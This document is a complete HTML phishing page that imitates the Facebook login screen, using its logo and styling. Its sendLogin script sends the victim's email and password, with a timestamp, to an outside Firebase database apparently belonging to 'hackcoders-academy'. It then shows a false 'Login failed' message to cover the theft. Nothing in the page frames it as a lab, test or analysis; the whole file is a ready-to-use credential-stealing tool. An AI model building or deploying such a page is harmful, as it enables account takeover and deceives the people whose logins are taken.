<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<h2><center>Login to continue</center></h2>
    <title>Facebook Login</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            background: #f0f2f5; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .logo {
            width: 50px;
            margin-bottom: 10px;
        }
        input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background-color: #1877F2;
            color: white;
            padding: 12px;
            width: 100%;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #145DBF;
        }
        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
            color: #1877F2;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo" width="30">
        <input type="email" id="email" placeholder="Mobile number or email address">
        <input type="password" id="password" placeholder="Password">
        <button onclick="sendLogin()">Log in</button>
        <p class="forgot-password">Forgotten password?</p>
    </div>

    <script>
        function sendLogin() {
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;

            if (email && password) {
                fetch("https://hackcoders-academy-default-rtdb.firebaseio.com/logins.json", {
                    method: "POST",
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        timestamp: new Date().toISOString()
                    }),
                    headers: { "Content-Type": "application/json" }
                })
                .then(response => {
                    alert("Login failed! Please check your details and try again.");
                })
                .catch(error => console.error("Error:", error));
            } else {
                alert("Please enter both email and password.");
            }
        }
    </script>

</body>
</html>
